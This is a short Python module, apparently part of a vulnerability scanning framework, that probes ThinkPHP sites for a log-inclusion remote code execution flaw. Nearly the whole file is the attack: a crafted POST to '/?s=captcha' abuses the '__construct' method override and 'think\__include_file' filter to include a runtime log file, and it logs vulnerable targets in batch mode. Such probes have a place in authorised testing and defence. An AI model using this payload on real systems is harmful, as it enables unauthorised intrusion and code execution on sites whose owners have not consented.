#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Thinkphp_Log_Rce_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/?s=captcha"
            header = {
                "User-Agent":self.headers["User-Agent"],
                "Content-Type": "application/x-www-form-urlencoded",
            }
            data = "_method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=../runtime/log/202403/11.log"
            req = requests.post(url,headers=header,proxies=self.proxy,verify=self.ssl,data=data)
            if "2024-03-11" in req.text:
                OutPrintInfoSuc("Thinkphp", f'目标存在日志包含漏洞: {url}')
                if self.batch:
                    OutPutFile("thinkphp_log_rce.txt",f'目标存在日志包含漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Thinkphp", f'目标不存在日志包含漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Thinkphp",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Thinkphp", '开始检测日志包含漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("Thinkphp", '日志包含漏洞检测结束')



